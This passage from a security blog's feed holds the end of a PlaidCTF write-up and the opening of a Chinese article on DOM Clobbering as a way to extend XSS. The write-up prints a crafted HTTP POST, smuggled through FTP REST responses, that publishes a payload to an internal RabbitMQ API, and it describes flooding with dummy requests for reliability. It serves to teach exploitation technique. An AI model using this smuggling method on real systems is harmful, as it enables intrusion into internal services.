src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/3.png" alt></p><p>And use <code>REST 6</code> to cut the message, make the response like a http message. This is similar with http response splitting.</p><p>So when ftp server return the data of profile picture, it will return data like this:</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/exchanges/%2f/amq%2edefault/publish</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: 172.32.56.72:15672</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">authorization</span>: Basic dGVzdDp0ZXN0</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 300</span><br><span class="line"></span><br><span class="line">{&quot;properties&quot;:{},&quot;routing_key&quot;:&quot;email&quot;,&quot;payload&quot;:&quot;your_payload&quot;,&quot;payload_encoding&quot;:&quot;base64&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>But the TCP connection is not persisted, we can&#x2019;t get the response of rabbitmq server and most importantly we can&#x2019;t add a new message in rabbitmq queue. </p><p>During the competition, we have to frequently send lots of requests to api server. Hope some requests can exploit successfully. At last we made it once.</p><p>After ctf ends, @zwad3, the author of this chall, replied to me.</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/zwad3/status/1252087190278082562" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/3.png" alt></p><p>Just like this, I put 1000 http get requests in one file and every time can get flag.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/4.png" alt></p><p>Interesting challange! Hope u enjoy!</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/</id>
        <title><![CDATA[使用 Dom Clobbering 扩展 XSS]]></title>
        <updated>2021-02-12T10:29:56+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"><![CDATA[<html><head></head><body><p>&#x524D;&#x51E0;&#x5929; PortSwigger &#x53D1;&#x5E03;&#x4E86; <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019" target="_blank" rel="noopener">Top 10 web hacking techniques of 2019</a>&#xFF0C;&#x699C;&#x4E0A;&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;p&#x725B;&#x4E5F;&#x80AF;&#x5B9A;&#x4F1A;&#x5728;&#x5C0F;&#x5BC6;&#x5708;&#x505A;&#x5206;&#x4EAB;&#x7684;&#xFF08;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BDD;&#x672C;&#x83DC;&#x4E5F;&#x4F1A;&#x5728;&#x81EA;&#x5DF1;<a href="https://blog.zeddyu.info">&#x535A;&#x5BA2;</a>&#x505A;&#x505A;&#x5B66;&#x4E60;&#x5206;&#x4EAB;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x804A; Top 10 &#x6280;&#x672F;&#x4E86;&#xFF0C;&#x5C31;&#x770B;&#x770B;&#x5728; Top 10 &#x63D0;&#x540D;&#x7ED3;&#x679C;&#x6CA1;&#x4E0A;&#x699C;&#x4F46;&#x662F;&#x4F9D;&#x65E7;&#x5F88;&#x6709;&#x610F;&#x601D;&#x7684;&#x6280;&#x672F; Dom Clobbering&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p></blockquote><a id="more"></a><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>From <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction" target="_blank" rel="noopener">MDN Web Docs</a>:</p><blockquote><p>&#x200B;    The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.</p><p>A Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript.</p><p>The <a href="http://www.w3.org/DOM/" target="_blank" rel="noopener">W3C DOM</a> and <a href="https://dom.spec.whatwg.org/" target="_blank" rel="noopener">WHATWG DOM</a> standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs.</p></blockquote><p>DOM &#x6700;&#x521D;&#x662F;&#x5728;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6807;&#x51C6;&#x5316;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8BDE;&#x751F;&#x548C;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x8FD9;&#x5BFC;&#x81F4;&#x4E86;&#x8BB8;&#x591A;&#x7279;&#x6B8A;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5F88;&#x591A;&#x6D4F;&#x89C8;&#x5668;&#x4ECD;&#x7136;&#x652F;&#x6301;&#x5F02;&#x5E38;&#x7684; DOM &#x3002;</p><p>DOM &#x7684;&#x65E7;&#x7248;&#x672C;&#xFF08;&#x5373;DOM Level 0 &amp; 1&#xFF09;&#x4EC5;&#x63D0;&#x4F9B;&#x4E86;&#x6709;&#x9650;&#x7684;&#x901A;&#x8FC7; JavaScript &#x5F15;&#x7528;&#x5143;&#x7D20;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E00;&#x4E9B;&#x7ECF;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x5143;&#x7D20;&#x5177;&#x6709;&#x4E13;&#x7528;&#x7684;&#x96C6;&#x5408;&#xFF08;&#x4F8B;&#x5982;<code>document.forms</code>&#xFF09;&#xFF0C;&#x800C;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>Window</code>&#x548C;<code>Document</code>&#x5BF9;&#x8C61;&#x4E0A;&#x7684;<code>name</code>&#x5C5E;&#x6027;&#x548C;<code>id</code>&#x5C5E;&#x6027;&#x6765;&#x5F15;&#x7528;&#xFF0C;</p><p>&#x663E;&#x7136;&#xFF0C;&#x652F;&#x6301;&#x8FD9;&#x4E9B;&#x5F15;&#x7528;&#x65B9;&#x5F0F;&#x4F1A;&#x5F15;&#x8D77;&#x6DF7;&#x6DC6;&#xFF0C;&#x5373;&#x4F7F;&#x8F83;&#x65B0;&#x7684;&#x89C4;&#x8303;&#x8BD5;&#x56FE;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x5411;&#x540E;&#x517C;&#x5BB9;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x884C;&#x4E3A;&#x90FD;&#x4E0D;&#x80FD;&#x8F7B;&#x6613;&#x66F4;&#x6539;&#x3002;&#x5E76;&#x4E14;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E4B;&#x95F4;&#x6CA1;&#x6709;&#x5171;&#x8BC6;&#xFF0C;&#x56E0;&#x6B64;&#x6BCF;&#x4E2A;&#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x80FD;&#x9075;&#x5FAA;&#x4E0D;&#x540C;&#x7684;&#x89C4;&#x8303;&#xFF08;&#x751A;&#x81F3;&#x6839;&#x672C;&#x6CA1;&#x6709;&#x6807;&#x51C6;&#xFF09;&#x3002;&#x663E;&#x7136;&#xFF0C;&#x7F3A;&#x4E4F;&#x6807;&#x51C6;&#x5316;&#x610F;&#x5473;&#x7740;&#x786E;&#x4FDD;DOM&#x7684;&#x5B89;&#x5168;&#x662F;&#x4E00;&#x9879;&#x91CD;&#x5927;&#x6311;&#x6218;&#x3002;</p><p>&#x7531;&#x4E8E;&#x975E;&#x6807;&#x51C6;&#x5316;&#x7684; DOM &#x884C;&#x4E3A;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x5411;&#x5404;&#x79CD; DOM &#x5143;&#x7D20;&#x6DFB;&#x52A0; name &amp; id &#x5C5E;&#x6027;&#xFF0C;&#x4F5C;&#x4E3A;&#x5BF9;&#x6587;&#x6863;&#x6216;&#x5168;&#x5C40;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x5F15;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x8FD9;&#x4F1A;&#x5BFC;&#x81F4;&#x8986;&#x76D6;&#x6389; document&#x539F;&#x6709;&#x7684;&#x5C5E;&#x6027;&#x6216;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x6216;&#x8005;&#x52AB;&#x6301;&#x4E00;&#x4E9B;&#x53D8;&#x91CF;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x540C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x6587;&#x7684;&#x5185;&#x5BB9;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7279;&#x522B;&#x6807;&#x6CE8;&#xFF0C;&#x5747;&#x9ED8;&#x8BA4;&#x5728; <strong>Chrome 80.0.3987.116</strong> &#x7248;&#x672C;&#x4E0A;&#x8FDB;&#x884C;&#x3002; </p><p>Dom Clobbering &#x5C31;&#x662F;&#x4E00;&#x79CD;&#x5C06; HTML &#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x9875;&#x9762;&#x4E2D;&#x4EE5;&#x64CD;&#x7EB5; DOM &#x5E76;&#x6700;&#x7EC8;&#x66F4;&#x6539;&#x9875;&#x9762;&#x4E0A; JavaScript &#x884C;&#x4E3A;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x65E0;&#x6CD5;&#x76F4;&#x63A5; XSS &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5F80; DOM Clobbering &#x8FD9;&#x65B9;&#x5411;&#x8003;&#x8651;&#x4E86;&#x3002; </p><h2 id="Simple-Example"><a href="#Simple-Example" class="headerlink" title="Simple Example"></a>Simple Example</h2><p>&#x5176;&#x5B9E; Dom Clobbering &#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x51E0;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x80FD;&#x77E5;&#x9053;&#x5B83;&#x662F;&#x5E72;&#x4EC0;&#x4E48;&#x4E86;&#x7684;&#x3002;</p><h3 id="Exmaple-1-Create"><a href="#Exmaple-1-Create" class="headerlink" title="Exmaple 1 - Create"></a>Exmaple 1 - Create</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png" alt></p><p>&#x4ECE;&#x56FE;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x5C5E;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>document</code>&#x6216;&#x8005;<code>window</code>&#x5BF9;&#x8C61;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x3002;</p><h3 id="Example-2-Overwrite"><a href="#Example-2-Overwrite" class="headerlink" title="Example 2 - Overwrite"></a>Example 2 - Overwrite</h3><p><img 